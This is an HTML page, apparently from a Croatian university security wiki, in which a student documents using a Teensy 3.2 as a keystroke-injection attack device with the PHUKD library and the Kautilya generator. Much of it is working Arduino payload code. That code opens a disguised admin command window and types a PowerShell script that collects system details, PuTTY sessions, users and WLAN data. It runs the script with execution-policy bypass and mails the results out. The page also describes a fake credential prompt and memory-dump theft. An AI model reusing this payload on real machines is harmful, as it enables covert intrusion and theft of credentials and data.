@@ -1,0 +1,762 @@
+<!DOCTYPE html>
+<html lang="hr" dir="ltr">
+<head>
+<meta charset="UTF-8" />
+<title>Teensy 3.2 (the Glitch/Rubberducky clone) - SIS Wiki</title>
+<meta name="generator" content="MediaWiki 1.17.0" />
+<link rel="shortcut icon" href="http://security.foi.hr/favicon.ico" />
+<link rel="search" type="application/opensearchdescription+xml" href="../../opensearch_desc.php" title="SIS Wiki (hr)" />
+<link rel="EditURI" type="application/rsd+xml" href="../../api.php%3Faction=rsd" />
+<link title="Creative Commons" type="application/rdf+xml" href="http://security.foi.hr/wiki/index.php?title=Teensy_3.2_(the_Glitch/Rubberducky_clone)&amp;action=creativecommons" rel="meta" />
+<link rel="copyright" href="http://creativecommons.org/licenses/by-sa/3.0/" />
+<link rel="alternate" type="application/atom+xml" title="SIS Wiki Atom izvor" href="../../index.php%3Ftitle=Posebno:Nedavne_promjene&amp;feed=atom" />
+<link rel="stylesheet" href="../../load.php%3Fdebug=false&amp;lang=hr&amp;modules=mediawiki.legacy.commonPrint%252Cshared%257Cskins.vector&amp;only=styles&amp;skin=vector&amp;*.css" />
+<meta name="ResourceLoaderDynamicStyles" content="" />
+<!--[if lt IE 7]><style type="text/css">body{behavior:url("/wiki/skins/vector/csshover.min.htc")}</style><![endif]--></head>
+<body class="mediawiki ltr ns-0 ns-subject page-Teensy_3_2_the_Glitch_Rubberducky_clone skin-vector">
+		<div id="mw-page-base" class="noprint"></div>
+		<div id="mw-head-base" class="noprint"></div>
+		<!-- content -->
+		<div id="content">
+			<a id="top"></a>
+			<div id="mw-js-message" style="display:none;"></div>
+						<!-- firstHeading -->
+			<h1 id="firstHeading" class="firstHeading">Teensy 3.2 (the Glitch/Rubberducky clone)</h1>
+			<!-- /firstHeading -->
+			<!-- bodyContent -->
+			<div id="bodyContent">
+				<!-- tagline -->
+				<div id="siteSub">Izvor: SIS Wiki</div>
+				<!-- /tagline -->
+				<!-- subtitle -->
+				<div id="contentSub"></div>
+				<!-- /subtitle -->
+																<!-- jumpto -->
+				<div id="jump-to-nav">
+					Skoči na: <a href="Rubberducky_clone).html#mw-head">orijentacija</a>,
+					<a href="Rubberducky_clone).html#p-search">traži</a>
+				</div>
+				<!-- /jumpto -->
+								<!-- bodytext -->
+				<p>Temu rezervirao&#160;: Aleksandar Trajkov
+</p><p><br />
+</p>
+<table id="toc" class="toc"><tr><td><div id="toctitle"><h2>Sadržaj</h2></div>
+<ul>
+<li class="toclevel-1 tocsection-1"><a href="Rubberducky_clone).html#Instalacija_i_uvod"><span class="tocnumber">1</span> <span class="toctext">Instalacija i uvod</span></a></li>
+<li class="toclevel-1 tocsection-2"><a href="Rubberducky_clone).html#PHUKD_i_Kautilya"><span class="tocnumber">2</span> <span class="toctext">PHUKD i Kautilya</span></a>
+<ul>
+<li class="toclevel-2 tocsection-3"><a href="Rubberducky_clone).html#PHUKD"><span class="tocnumber">2.1</span> <span class="toctext">PHUKD</span></a></li>
+<li class="toclevel-2 tocsection-4"><a href="Rubberducky_clone).html#Kautilya"><span class="tocnumber">2.2</span> <span class="toctext">Kautilya</span></a></li>
+</ul>
+</li>
+<li class="toclevel-1 tocsection-5"><a href="Rubberducky_clone).html#Zaklju.C4.8Dak"><span class="tocnumber">3</span> <span class="toctext">Zaključak</span></a></li>
+<li class="toclevel-1 tocsection-6"><a href="Rubberducky_clone).html#Literatura"><span class="tocnumber">4</span> <span class="toctext">Literatura</span></a></li>
+</ul>
+</td></tr></table>
+<h2> <span class="mw-headline" id="Instalacija_i_uvod"> Instalacija i uvod </span></h2>
+<p>Teensy je cijelovit sustav baziran na USB-u za razvoj pomoću mikrokontrolera. Krasi ga mogućnost reprogramiranja, a svo programiranje izvršava se preko USB porta. 
+</p>
+<div class="thumb tleft"><div class="thumbinner" style="width:302px;"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Teensy.jpg" class="image"><img alt="" src="../../images/thumb/0/04/Teensy.jpg/300px-Teensy.jpg" width="300" height="300" class="thumbimage" /></a>  <div class="thumbcaption"><div class="magnify"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Teensy.jpg" class="internal" title="Povećaj"><img src="../../skins/common/images/magnify-clip.png" width="15" height="11" alt="" /></a></div>Teensy 3.2 bez pinova</div></div></div>
+<p>Teensy 3.2/3.1 (jer su vrlo slične verzije pa ih se često poistovjećuje) posjeduje sljedeće performanse&#160;:
+</p>
+<ol>
+<li> Processor - MK20DX256 32 bit ARM Cortex-M4 72 MHz </li>
+<li> Flash Memory - 262144 </li>
+<li> Ram Memory - 65536 </li>
+<li> EEPROM - 2048 </li>
+<li> I/O - 34, 3.3V, 5V </li>
+<li> Analog In - 21 </li>
+<li> PWM - 12 </li>
+<li> UART,I2C, SPI - 3,2,1 </li>
+<li> Cijena - $19,80 (139,59 HRK) </li>
+</ol>
+<p>Teensy se koristi na način da se najprije instalira neka od Arduino verzija, najnovija je 1.8.1. ako se ne varam međutim nije kompatibilna sa Teensyduinom (add-on) koji će nam biti potreban za pokretanje koda u Teensyju,
+pa ćemo koristiti verziju 1.8.0., a može se downloadati <a href="https://www.arduino.cc/en/Main/Software" class="external text" rel="nofollow">ovdje</a>.
+</p><p>Nakon instalacije Arduina, potrebno je downloadati već spomenuti Teensyduino, a na <a href="https://www.pjrc.com/teensy/td_download.html" class="external text" rel="nofollow">stranici</a> imate korake kako instalirati Teensyduino na pojedinom sustavu.
+</p><p>Trenutno imate konfiguraciju koja radi na windows sustavima. Iz nekih trećih i kompliciranih razloga, to mi nije proradilo na Ubuntuu, ali opet, možda nisam bio dovoljno uporan. Sada možete pisati kod u Arduinu i programirati svoj Teensy da radi sve što zapišete.
+</p>
+<hr />
+<p><br />
+</p><p><b>Zašto</b> koristiti Teensy za pen-testing?
+</p>
+<ol>
+<li>Piše brže nego čovjek, i to <b>bez greške</b> što je ključno kad je napad vremenski limitiran</li>
+<li>Radi i kad je U3 autorun isključen</li>
+<li>Privlači manje pozornosti za razliku od sjedenja pred terminalom. Ovako je dovoljno da osoba okrene glavu od računala i bum - priključeni ste.</li>
+<li>Može biti programiran sa timerom kada znate da će meta biti za računalom, ili preko senzora to može doznati pa napad može bit direktan i učinkovit.</li>
+<li>Ubacite uređaj u USB uređaj i imate programski kod + spremište podataka.</li>
+</ol>
+<p><b>Što</b> raditi pomoću Teensyja?
+</p>
+<ol>
+<li>Dodati usera</li>
+<li>Pokrenuti program koji postavlja backdoor</li>
+<li>Kopirati podatke na svoj thumbdrive</li>
+<li>Otići na website sa cookiesima i napravit nekakvu transakciju (kao CSRF, ali baziranu na hardveru)</li>
+</ol>
+<p><br />
+</p>
+<div class="thumb tright"><div class="thumbinner" style="width:452px;"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Ss1.png" class="image"><img alt="" src="../../images/thumb/4/4e/Ss1.png/450px-Ss1.png" width="450" height="295" class="thumbimage" /></a>  <div class="thumbcaption"><div class="magnify"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Ss1.png" class="internal" title="Povećaj"><img src="../../skins/common/images/magnify-clip.png" width="15" height="11" alt="" /></a></div>Arduino IDE sa Teensyduino add-onom</div></div></div> 
+<p>Kao što se vidi na Slici 2, kod se u Arduinu dijeli na 2 dijela, <b>setup</b> i <b>loop</b>. Setup se pri spajanju Teensyja na računalo izvršava samo 1, odmah pri spajanju na računalo, dok se loop konstantno vrti i pogodan je za Teensy budući da ima pinove koji se daju prespajati, pa se mogu izvršavati različiti blokovi koda, recimo na poziciji pina 1 (na Teensyju potrebno povezati pin GND-uzemljenje, i pin br.1) se pokreće nekakav sniffer, dok promjenom tog pina, na npr. pin broj 3 se nalazi installer backdoora ili nešto treće. Dakle loop postoji sa svrhom dinamičnosti, promjene funkcionalnosti, što se u setupu ne može izvršiti.
+</p><p><br />
+Kao što smo već rekli, kod je vrlo sličan c++-u i c-u, tako da sintaksno nebi trebali imati problema osim nekakvih izuzetaka. Libraryji se uključuju u zaglavlju koda, a globalne varijable se definiraju ispod toga, onda dalje idu setup i loop, te je ispod toga moguće definirati neke funkcije kako bi ih pozivali u kodu po potrebi.
+</p><p>Primjer koda je na slici 2. Odmah na prvoj liniji koda vidimo include biblioteke koje nam trebaju, može ih biti i više, a morate ih prvo fizički ubaci u arduino folder (".../Arduino LLC\Arduino\libraries"), te se onda može slobodno pozvati bez problema u kodu. Odmah ispod toga slijede definicije nekih globalnih varijabli koje nam negdje mogu trebati ili ne (Sve na slici je samo za primjer).
+</p><p>U odjeljku <b>setup</b> vidimo isječak koda koji nam treba za "razumjevanje" koji pinovi su aktivni na Teensyju, kako bi kasnije u odjeljku <b>loop</b> mogli odabrati koja funkcija se izvršava ovisno o aktivnosti pina 
+</p><p><br />
+<code>
+if(!digitalRead(pin1)) neka_funkcija();
+</code>
+</p><p><br />
+te ispod toga normalno nastavak, odnosno definicija i deklaracija funkcija po potrebi.
+</p><p><br />
+</p><p><br />
+</p><p><br />
+</p>
+<h2> <span class="mw-headline" id="PHUKD_i_Kautilya"> PHUKD i Kautilya </span></h2>
+<h3> <span class="mw-headline" id="PHUKD">PHUKD</span></h3>
+<p>Iza simpatičnog akronima <b>PHUKD</b> krije se sve što trebate znati o uređaju. <b>P</b>rogrammable <b>H</b>ID <b>U</b>SB <b>K</b>eystroke <b>D</b>ongle se koristi često kao "posrednik", neki nevidljivi uređaj između npr miša kojeg ste kupili sa E-baya i vašeg računala. Phukd uređaj je ugrađen na miš, dakle na kraj njegovog USB kabla ide PHUKD uređaj koji prosljeđuje podatke računalu i "pravi se" da je miš, tipkovnica ili nešto treće. Naime računalo taj uređaj doživljava kao miš, tipkovnicu ili nešto treće te ga ne provjerava kao memory storage ili običan usb, dok se u pozadini može izvršiti neki zadatak koji je napisan u kodu. Tako možete naići na stvar koja se zove <i>Trojanski miš</i> i bit žrtva nekog spywarea, a da ni ne znate.
+</p>
+<div class="thumb tleft"><div class="thumbinner" style="width:652px;"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Trojan_mouse.jpg" class="image"><img alt="" src="../../images/thumb/f/f1/Trojan_mouse.jpg/650px-Trojan_mouse.jpg" width="650" height="484" class="thumbimage" /></a>  <div class="thumbcaption"><div class="magnify"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Trojan_mouse.jpg" class="internal" title="Povećaj"><img src="../../skins/common/images/magnify-clip.png" width="15" height="11" alt="" /></a></div>Trojanski miš</div></div></div> 
+<p>PHUKD spominjem iz razloga što se na <a href="http://www.irongeek.com/i.php?page=security/programmable-hid-usb-keystroke-dongle#Programming_examples_and_my_PHUKD_library" class="external text" rel="nofollow">stranicama</a> Iron Geek-a, moe pronaći phukdlib.h biblioteka sa nekim interesantnim funkcijama koje vam za početak mogu pomoći u razumijevanju funkcioniranja Teensyja.
+</p><p><br />
+<code>
+</p>
+<pre>    CommandAtRunBarMSWIN(char *SomeCommand)
+    Opens the MS Windows run bar and executes the given command
+</pre>
+<pre>    CommandAtRunBarGnome(char *SomeCommand)
+    Opens a run bar in Gnome under Linux and executes the given command
+</pre>
+<pre>    CommandAtRunBarOSX(char *SomeCommand)
+    Opens Spotlight under OS X and executes the given command
+    
+    CommandAtNewTerminal(char *SomeCommand);
+    Opens a Terminal under OS X and executes the given command.
+    
+    ShrinkCurWinMSWIN()
+    Shrinks the active window to help hide it in MS Windows.
+    
+    ShrinkCurWinGnome()
+    Shrinks the active window to help hide it in Gnome.
+    
+    ShrinkCurWinOSX();
+    Shrinks the active window to help hide it in OS X.
+    
+    PressAndRelease(int KeyCode, int KeyCount)
+    
+    This function simplifies the pressing and releasing of a key. You can also specify how many
+    times to hit the key (really useful for tabbing to where you need to be on web sites).
+</pre>
+<p></code>
+</p><p><br />
+Ovo su samo neke od funkcija koje phukdlib.h ima definirano, i vrlo su korisne za početnike, a ako vas zanima još, <a href="http://www.irongeek.com/downloads/phukdlib0.4.zip" class="external text" rel="nofollow">downloadajte</a> zip sa kodom biblioteka
+</p><p><br />
+</p><p><br />
+</p>
+<h3> <span class="mw-headline" id="Kautilya">Kautilya</span></h3>
+<p>Moram priznati da mi ništa nije bilo jasno kad je profesor Kišasondi rekao da pogledam taj <a href="https://github.com/tkisason/Kautilya" class="external text" rel="nofollow">repozitorij</a> na Gitu, međutim ispalo je da je Kautilya prepredobra i da je to na neki način generator koda za napade, ovisno o napadu koji želite izvest, na kojem operacijskom sustavu i slično. U početku se činilo kako je to gotov kod na stranici i vidio se "princip" koda, odnosno što bi trebao raditi otprilike, međutim falile su neke definicije funkcija i još dosta pojedinosti koje generator baziran na Rubyju generira.
+</p><p>Za instalaciju svega na linuxu, koristite <a href="http://forum.top-hat-sec.com/index.php?topic=5503.0" class="external text" rel="nofollow">ovu</a> stranicu. Arduino za instalirati na linuxu - nije problem. Teensyduino plugin za instalirati na linuxu - nije problem (protip&#160;: za doznati gdje se nalazi .exe od Arduina, a trebat će vam, koristite naredbu <code>which Arduino</code>). Čak niti ubaciti UDEV rules datoteku nije toliko teško (sve opisano na stranici), <b>međutim</b>...... za pokrenuti Kautilyu je trebalo barem 2,5h.
+Bundler koji je potreban za pokretanje Kautilye se može instalirati <a href="http://bundler.io/" class="external text" rel="nofollow">ovako</a> ili jednostavno upišite sljedeće naredbe u terminal
+</p><p><code>
+gem install bundler
+</code>
+</p><p>Nakon toga specificirajte zavisnosti u Gemfileu vašeg projekta (za Kautilyu treba colored, highline i artii) dodajte sljedeće retke&#160;: 
+<code>
+</p>
+<pre>    source '<a href="https://rubygems.org'" class="external free" rel="nofollow">https://rubygems.org'</a>
+    gem 'nokogiri'
+    gem 'rack', '~&gt; 2.0.1'
+    gem 'rspec'
+</pre>
+<p></code>
+</p><p>i tu će vam vjerojatno javiti kako gem Rack 2.0.1. više nije podržan, te da koristite naredbu <code> bundle install </code> kako bi se integrirala prva sljedeća radeća verzija. Međutim ako ste ruby skinuli samo pomoću 
+</p><p><code> sudo apt-get install ruby </code> ili ruby-full, verzija rubyja će biti 1.9.1 dok bundle zahtjeva minimalno 2.1.0 verziju i tu počinju problemi. Čak i nakon što se ruby 1.9.1. deinstalirao, a novi ruby 2.4.0 instalirao, u bundle i bundler ruby fileovima stoji ruby 1.9.1. pa vodite računa da tamo promjenite verzije, i upišete pravilne putanje do ruby.exe-a pomoću kojeg ćete pokrenuti generator kasnije. Detaljnu instalaciju pogledajte <a href="https://gorails.com/setup/ubuntu/14.04" class="external text" rel="nofollow">ovdje</a>.
+</p><p><br />
+Sljedeći korak je otići u Kautilya folder gdje se nalazi .rb file i upisati:
+</p><p><br />
+<code>
+sudo putanja/do/ruby.exe kautilya.rb 
+</code>
+</p><p><br />
+i voila! Pokrenuli ste Kautilyu. 
+</p>
+<div class="thumb tleft"><div class="thumbinner" style="width:652px;"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Ss2.png" class="image"><img alt="" src="../../images/thumb/8/85/Ss2.png/650px-Ss2.png" width="650" height="328" class="thumbimage" /></a>  <div class="thumbcaption"><div class="magnify"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Ss2.png" class="internal" title="Povećaj"><img src="../../skins/common/images/magnify-clip.png" width="15" height="11" alt="" /></a></div>Kautilya.rb u terminalu</div></div></div>
+<div class="thumb tleft"><div class="thumbinner" style="width:652px;"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Kautilya.png" class="image"><img alt="" src="../../images/thumb/8/82/Kautilya.png/650px-Kautilya.png" width="650" height="401" class="thumbimage" /></a>  <div class="thumbcaption"><div class="magnify"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Kautilya.png" class="internal" title="Povećaj"><img src="../../skins/common/images/magnify-clip.png" width="15" height="11" alt="" /></a></div>Opcije u Kautilya.rb</div></div></div>
+<p>Kautilya ima mnoštvo mogućnosti i opcija kao što se vidi na slici iznad. Sve generirane .ino i .pde datoteke nalaze se u /output folderu u Kautilya matičnom folderu. 
+Ono što sam ja implementirao u ovom projektu je da sam stavio 4 različita funkcionalna koda na Teensy s razlogom da "mijenjam" napade na računalu s promjenom pinova. Implementiran je i sigurnosni mehanizam da se napad izvrši samo jednom po uključivanju kako nebi došlo do loopa te se vađenjem Teensyja prekida napad, i može ostaviti "tragove" za sobom.
+</p><p>Generirao sam 4 opcije iz Kautilye za probu kako bi ih implementirao na Teensy, a kasnije su sastavljene na način da rade jednokratno na promjenu pina i to na pinovima od 3 do 6. Prvo sam generirao Info.pde koji s opcijom slanja podataka na gmail vraća wlan key-eve i imena napravljenih profila, naziv usera, instalirane aplikacije, pokrenute servise i još mnogo toga što možete vidjeti u mailu kad vam stigne. Sljedeće sam generirao wlan_key.ino koji vraća sve profile koje imate u računalu, sve WLAN-ove na koje ste se spajali i informacije o njima. Iza toga sam pokušao sa credentials.ino kodom koji generira lažni prozor koji izgleda kao windows prozor i traži da unesete username i password od trenutnog računa, i stvarno funkcionira jer ne možete bilo što unijeti, mora odgovarati računu sa kojim ste ulogirani. Naposljetku sam još probao memdump.ino file koji generira memory dump, odnosno .dmp file i šalje ga na gmail, pa se dalje s tim može raditi što se hoće uz odgovarajuće alate. Ta 4 bloka kodova sam implementirao u jedan file koji otprilike izgleda ovako&#160;: 
+</p><p><code>
+</p>
+<pre>   #define BOARDTYPE
+   #ifdef TEENSY2
+   #include&lt;usb_private.h&gt;
+   #endif
+</pre>
+<p></code>
+</p><p>Nakon što sam obavio pozive biblioteka, slijede globalne varijable i postavke
+</p><p><code>
+</p>
+<pre>    int thispin;
+    int PhotoRead = analogRead(0);
+    int OldPhotoRead = PhotoRead;
+    int ledPin =  11;   
+    boolean ledPinState = true;
+    boolean CapsLockTrapSet = false;
+    int DIP_1 = 3;
+    int DIP_2 = 4;
+    int DIP_3 = 5;
+    int DIP_4 = 6;
+</pre>
+<pre>    int z1 = 0;
+    int z2 = 0;
+    int z3 = 0;
+    int z4 = 0;  
+    
+    char *DIPOptions=
+    "DIP 1 Info o racunalu \n\r" 
+    "Dip 2 Wlan info \n\r"
+    "Dip 3 Credentials cheat \n\r"
+    "Dip 4 Memdump \n\r"
+   &#160;;
+</pre>
+<p></code>
+</p><p>Z* varijable koristim samo kako bi se zadaci izvršili samo jednom, čim se aktivira Teensy, dobivaju vrijednost 0, nakon izvršavanja funkcionalnosti, dobijaju vrijednost 1 i poslije toga, loop "čeka" jer se ispred svake funkcionalnosti nalazi provjera da je Z1,2,3,4 == 0 što znači da je "prvi ulaz" u taj dio koda od uključenja Teensyja. Slijedi <b>setup</b> iz libdev filea koji je došao uz phukdlib.h, a s kojim se radi sa različitim pinovima.
+</p><p><code>
+</p>
+<pre>    void setup()   {
+    for (int thispin=0; thispin &lt;=10;thispin++){
+    pinMode(thispin, INPUT_PULLUP); // Dip
+    }
+    pinMode(ledPin, OUTPUT);   
+    }
+</pre>
+<p></code>
+</p><p><br />
+Sada slijede odsječci koda u <b>loop</b> dijelu sketcha koji se dijele prema pinu, ponovno linija <code>!digitalRead(pin_neki_broj)</code> pomoću koje provjeravamo koji je pin uključen, no da najprije definiram 2 funkcije koje koristim, a u svakom bloku koda su. Prva funkcija je startup() koju svaki dio koda izvrši na početku.
+</p><p><code>
+</p>
+<pre>    void startup(){
+      delay(1000);
+      wait_for_drivers(2000);
+    
+      minimise_windows();
+      delay(500);
+      while(!cmd_admin(3,500))
+      {
+      reset_windows_desktop(2000);
+      }
+      }
+</pre>
+<p></code>
+I Druga funkcija showout(char *some) koja prosljeđuje podatke na jedan od odabranih načina (kod nas je to na gmail).
+<code>
+</p>
+<pre>     void showout(char *some){
+      String fn = some;
+      String fp;
+       if ("gmail" == "pastebin")
+      {
+        pastebin(fn);
+      }
+      else if ("gmail" == "gmail")
+      {
+        if (fp&#160;!= "")
+        {
+            gmail(fn,fp);
+        }
+        else
+        {
+            gmail(fn,"no");
+        }
+      }
+      else if ("gmail" == "post")
+      {
+        hpost(fn);
+      }
+      else if ("gmail" == "dns")
+      {
+        dns(fn);
+      }
+      }
+</pre>
+<p></code>
+</p><p>i dodatne definicije nekih funkcija koje se ovdje spominju, a definirane su na kraju sketcha.
+</p><p><code>
+</p>
+<pre>    void reset_windows_desktop(int sleep)
+    {
+    delay(1000);
+    minimise_windows();
+    delay(sleep);
+    minimise_windows();
+    delay(sleep);
+    minimise_windows();
+    delay(200);
+    }
+    
+    void minimise_windows(void)
+    {
+    Keyboard.set_modifier(MODIFIERKEY_RIGHT_GUI);
+    Keyboard.set_key1(KEY_M);
+    Keyboard.send_now();
+    delay(300);
+    Keyboard.set_modifier(0);
+    Keyboard.set_key1(0);
+    Keyboard.send_now();
+    delay(500);
+    delay(300);
+    }
+    
+    bool cmd_admin(int reps, int millisecs)
+    {
+    make_sure_capslock_is_off();
+    delay(700);
+    Keyboard.set_modifier(MODIFIERKEY_RIGHT_GUI);
+    Keyboard.send_now();
+    Keyboard.set_modifier(0);
+    Keyboard.send_now();
+    delay(3000);
+    Keyboard.print("cmd /T:01 /K \"@echo off &amp;&amp; mode con:COLS=15 LINES=1 &amp;&amp; title Installing Drivers\"");
+    delay(2000);
+    Keyboard.set_modifier(MODIFIERKEY_CTRL);
+    Keyboard.send_now();
+    Keyboard.set_modifier(MODIFIERKEY_CTRL | MODIFIERKEY_SHIFT);
+    Keyboard.send_now();
+    Keyboard.set_key1(KEY_ENTER);
+    Keyboard.send_now();
+    delay(200);
+    Keyboard.set_modifier(0);
+    Keyboard.set_key1(0);
+    Keyboard.send_now();
+    delay(500);
+    delay(7000);
+    send_left_enter();
+    delay(4000);
+    create_click_capslock_win();
+    check_for_capslock_success_teensy(reps,millisecs);
+    }
+    
+    void wait_for_drivers(int sleep)
+    {
+    bool CapsLockTrap = is_caps_on();
+    while(CapsLockTrap == is_caps_on())
+    {
+    Keyboard.set_key1(KEY_CAPS_LOCK);
+    Keyboard.send_now();
+    delay(200);
+    Keyboard.set_modifier(0);
+    Keyboard.set_key1(0);
+    Keyboard.send_now();
+    delay(500);
+    delay(sleep);
+    }
+    Keyboard.set_key1(KEY_CAPS_LOCK);
+    Keyboard.send_now();
+    delay(200);
+    Keyboard.set_modifier(0);
+    Keyboard.set_key1(0);
+    Keyboard.send_now();
+    delay(500);
+    delay(sleep);
+    }
+</pre>
+<p></code>
+</p><p>Sami nazivi funkcija govore što koja radi, dakle dosta su intuitivne. Posljednje što je ostalo su linije koje je Kautilya generirala, a direktne su naredbe za cmd. Prva je Info o računalu.
+</p><p><code>
+</p>
+<pre>    if (!digitalRead(DIP_1)) {
+ if(z1==0){
+      startup();
+      z1++;
+      Keyboard.println("echo $pn = $env:COMPUTERNAME + \"  Info\" &gt;&#160;%temp%\\in.ps1");
+      Keyboard.println("echo $user = \"vašemail\" &gt;&gt;&#160;%temp%\\in.ps1");
+      Keyboard.println("echo $pass = \"vašašifra\" &gt;&gt;&#160;%temp%\\in.ps1");
+      Keyboard.println("echo $dev = \"INPUT3\" &gt;&gt;&#160;%temp%\\in.ps1");
+      delay(1000);
+      Keyboard.println("echo function regv($rk, $rg,$ch) &gt;&gt;&#160;%temp%\\in.ps1");
+      Keyboard.println("echo { &gt;&gt;&#160;%temp%\\in.ps1");
+      Keyboard.println("echo if ($ch -eq \"no\"){$key = get-item $rk} &gt;&gt;&#160;%temp%\\in.ps1");
+      Keyboard.println("echo else{$key = ls $rk} &gt;&gt;&#160;%temp%\\in.ps1");
+      Keyboard.println("echo $key ^| &gt;&gt;&#160;%temp%\\in.ps1");
+      Keyboard.println("echo ForEach-Object { &gt;&gt;&#160;%temp%\\in.ps1");
+      Keyboard.println("echo $v = gp $_.PSPath &gt;&gt;&#160;%temp%\\in.ps1");
+      Keyboard.println("echo ForEach ($value in $_.Property) &gt;&gt;&#160;%temp%\\in.ps1");
+      Keyboard.println("echo { &gt;&gt;&#160;%temp%\\in.ps1");
+      Keyboard.println("echo if ($rg -eq \"all\") {$v.$value} &gt;&gt;&#160;%temp%\\in.ps1");
+      Keyboard.println("echo elseif ($rg -eq \"allname\"){$value} &gt;&gt;&#160;%temp%\\in.ps1");
+      Keyboard.println("echo else {$v.$rg;break} &gt;&gt;&#160;%temp%\\in.ps1");
+      Keyboard.println("echo }}} &gt;&gt;&#160;%temp%\\in.ps1");
+      Keyboard.println("echo $o = \"Logged in users:`n\" + (regv \"hklm:\\software\\microsoft\\windows nt\\currentversion\\profilelist\" \"profileimagepath\") &gt;&gt;&#160;%temp%\\in.ps1");
+      Keyboard.println("echo $o = $o + \"`n PS Env:`n\" + (regv \"hklm:\\software\\microsoft\\powershell\1\" \"allname\") &gt;&gt;&#160;%temp%\\in.ps1");
+      Keyboard.println("echo $o = $o + \"`n Putty trusted hosts:`n\" + (regv \"hkcu:\\software\\simontatham\\putty\" \"allname\") &gt;&gt;&#160;%temp%\\in.ps1");
+      Keyboard.println("echo $o = $o + \"`n Putty saved sessions:`n\" + (regv \"hkcu:\\software\\simontatham\\putty\\sessions\" \"all\") &gt;&gt;&#160;%temp%\\in.ps1");
+      Keyboard.println("echo $o = $o + \"`n Shares:`n\" + (regv \"hklm:\\SYSTEM\\CurrentControlSet\\services\\LanmanServer\\Shares\" \"all\" \"no\") &gt;&gt;&#160;%temp%\\in.ps1");
+      Keyboard.println("echo $o = $o + \"`n Env vars:`n\" + (regv \"hklm:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment\" \"all\" \"no\") &gt;&gt;&#160;%temp%\\in.ps1");
+      Keyboard.println("echo $o = $o + \"`n Current user:`n\" + (regv \"hkcu:\\Volatile Environment\" \"all\" \"no\") &gt;&gt;&#160;%temp%\\in.ps1");
+      Keyboard.println("echo $o = $o + \"`n SNMP cs:`n\" + (regv \"hklm:\\SYSTEM\\CurrentControlSet\\services\\snmp\\parameters\\validcommunities\" \"all\" \"no\") &gt;&gt;&#160;%temp%\\in.ps1");
+      Keyboard.println("echo $o = $o + \"`n SNMP cs - user:`n\" + (regv \"hkcu:\\SYSTEM\\CurrentControlSet\\services\\snmp\\parameters\\validcommunities\" \"all\" \"no\") &gt;&gt;&#160;%temp%\\in.ps1");
+      Keyboard.println("echo $o = $o + \"`n Installed Apps:`n\" + (regv \"hklm:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\" \"displayname\") &gt;&gt;&#160;%temp%\\in.ps1");
+      Keyboard.println("echo $o = $o + \"`n Installed Apps - user:`n\" + (regv \"hkcu:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\" \"displayname\") &gt;&gt;&#160;%temp%\\in.ps1");
+      Keyboard.println("echo $o = $o + \"`n Domain:`n\" + (regv \"hklm:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Group Policy\\History\\\" \"all\" \"no\") &gt;&gt;&#160;%temp%\\in.ps1");
+      Keyboard.println("echo $o = $o + \"`n Contents of /etc/hosts:`n\" + (gc -path \"C:\\windows\\System32\\drivers\\etc\\hosts\") &gt;&gt;&#160;%temp%\\in.ps1");
+      Keyboard.println("echo $o = $o + \"`n Running Services:`n\" + (net start) &gt;&gt;&#160;%temp%\\in.ps1");
+      Keyboard.println("echo $o = $o + \"`n Account Policy:`n\" + (net accounts) &gt;&gt;&#160;%temp%\\in.ps1");
+      Keyboard.println("echo $o = $o + \"`n Local users:`n\" + (net user) &gt;&gt;&#160;%temp%\\in.ps1");
+      Keyboard.println("echo $o = $o + \"`n Local Groups:`n\" + (net localgroup) &gt;&gt;&#160;%temp%\\in.ps1");
+      Keyboard.println("echo $o = $o + \"`n WLAN Info:`n\" + (netsh wlan show all) &gt;&gt;&#160;%temp%\\in.ps1");
+      Keyboard.println("echo $o = $o.Replace(\"/\",\"\\\") &gt;&gt;&#160;%temp%\\in.ps1");
+      Keyboard.println("echo $pv = $o.Replace(\"www\",\"uuu\") &gt;&gt;&#160;%temp%\\in.ps1");
+      showout("in");
+      Keyboard.println("echo Set oShell = CreateObject(\"WScript.Shell\") &gt;&#160;%temp%\\in.vbs");
+      Keyboard.println("echo oShell.Run(\"powershell.exe -ep bypass -nologo -c&#160;%temp%\\in.ps1\"),0,true &gt;&gt;&#160;%temp%\\in.vbs");
+      delay(1000);
+      Keyboard.println("wscript&#160;%temp%\\in.vbs");
+      delay(1000);
+      Keyboard.println("exit");
+        }}  //           
+</pre>
+<p></code>
+</p><p>Što rezultira otprilike ovakvim mailom, i podacima o računalu&#160;: 
+</p>
+<div class="center"><div class="thumb tnone"><div class="thumbinner" style="width:600px;"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Ss3.png" class="image"><img alt="" src="../../images/2/27/Ss3.png" width="598" height="627" class="thumbimage" /></a>  <div class="thumbcaption"><div class="magnify"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Ss3.png" class="internal" title="Povećaj"><img src="../../skins/common/images/magnify-clip.png" width="15" height="11" alt="" /></a></div>Mail koji pristigne nakon "obrade" računala</div></div></div></div>
+<p><br />
+Popis podataka o računalu je poprilično detaljan, sadrži podnaslove kao što su Logged in users, PS Env, Putty saved sessions, Shares, Env vars, SNMP cs, SNMP cs - user, Installed Apps, Installed Apps - user, Domain, Contents of \etc\hosts, Running Services, Account Policy, Local users, local groups i Wlan info. 
+Sljedeći odsječak koda pokazuje nam što se dešava kad je pin 4 aktivan, odnosno kada želimo samo Wlan info od mete.
+</p><p><br />
+</p>
+<div class="thumb tright"><div class="thumbinner" style="width:552px;"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Ss4.png" class="image"><img alt="" src="../../images/thumb/f/f1/Ss4.png/550px-Ss4.png" width="550" height="336" class="thumbimage" /></a>  <div class="thumbcaption"><div class="magnify"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Ss4.png" class="internal" title="Povećaj"><img src="../../skins/common/images/magnify-clip.png" width="15" height="11" alt="" /></a></div>Mail koji pristigne nakon "obrade" računala - Wlan info</div></div></div>
